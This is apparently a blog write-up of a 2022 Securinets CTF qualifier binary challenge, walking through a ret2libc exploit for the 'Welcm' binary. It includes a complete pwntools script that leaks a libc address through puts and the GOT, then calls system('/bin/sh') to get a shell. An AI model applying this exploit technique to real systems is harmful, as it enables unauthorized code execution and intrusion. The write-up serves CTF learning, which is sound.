# National Cyber Security Congress

[Securiday](https://www.facebook.com/Securiday-104756755537130/) qualifiation round, hosted by [Securinets](https://www.facebook.com/Securinets), a 24 hour CTF. Top #10 teams will be able to compete in Securiday CTF.<br/>
I've participated in the CTF as a member of Enthousiast team. We ranked 22 out of 295 teams.<br />
I'll be sharing a writeup for the Binary Exploitation challenges.

<br/>
<hr>

* ### Welcm

For this one, we get a binary & a libc, what a time saver.

As a start, we'll check the security of the binary.

<p align="center">
  <img src="/2022/Securinets%20CTF%20Quals/imgs/sec.png"><br/>
</p>
<br />

Now, let's check the binary in Ghidra:
<p align="center">
  <img src="/2022/Securinets%20CTF%20Quals/imgs/welcm.png"><br/>
</p>
<br />

A basic ret2libc, we check ropper for a `pop rdi` gadget:

<p align="center">
  <img src="/2022/Securinets%20CTF%20Quals/imgs/pop_rdi.png"><br/>
</p>
<br />

Now, let's head to GDB, we check the functions we have ( `info functions` )

<p align="center">
  <img src="/2022/Securinets%20CTF%20Quals/imgs/gdb.png"><br/>
</p>
<br />

No tricks I see, We have everything we'll need.

As a start, we'll need to leak a libc address from the GOT entry. Since we have `puts` available in the binary, we can use it to leak our address. After that, we'll be able to calculate the libc base address. Therefore, we'll be able to find `system` address in memory alongside our `/bin/sh` string.

Summary:

1. Return to `puts`, giving it it's own GOT entry address as a parameter.
2. Find libc base address.
3. Return to `system` giving it `/bin/sh` as parameter.

Considering Ghidra's output, we have 128 bytes for our input + 8 bytes for the RBP, which gives us a total of 136 bytes for the RIP offset. We can start writing our payload.

<details>
  <summary>Show payload</summary>
  
  ```python
  #!/usr/bin/env python3

  from pwn import *

  exe = ELF("./welc_patched")
  libc = ELF("./libc.so.6", checksec=False)

  context.binary = exe
  LOCAL = False


  def conn():
      if LOCAL:
          r = process([exe.path])
      else:
          r = remote("20.216.39.14", 1237)

      return r


  def main():
      r = conn()

      PUTS_PLT = p64(0x0000000000401060)
      PUTS_GOT = p64(0x404018)
      POP_RDI  = p64(0x0000000000401283)
      MAIN     = p64(0x00000000004011db)
      MAIN_RET = p64(0x000000000040121e)

      offset = 136

      # First stage
      # Leak puts address & return to main for stage 2
      payload = b"A"*offset
      payload += POP_RDI
      payload += PUTS_GOT
      payload += PUTS_PLT
      payload += MAIN

      print(payload)

      r.sendline(payload)

      r.recvuntil(b'about you ?\n')
      leak_puts = u64(r.readline()[:-1].ljust(8, b'\x00'))
      base_libc = leak_puts - libc.sym['puts'] # Libc base

      print('Leaked libc           :', hex(leak_puts))
      print('Libc base             :', hex(base_libc))

      SYSTEM = p64(libc.sym['system'] + base_libc)
      BIN    = p64(next(libc.search(b'/bin/sh')) + base_libc)

      # Stage 2, System("/bin/sh")
      payload = b"A"*offset
      payload += MAIN_RET # Alignement
      payload += POP_RDI
      payload += BIN
      payload += SYSTEM

      r.sendline(payload)

      r.interactive()


  if __name__ == "__main__":
      main()
  ```
</details>

And we get our flag: `Securinets{5d91d2e01b854fd457c1d8b592a19b38af6b4a33c6362b7d}`


* ### shellcraft

WIP
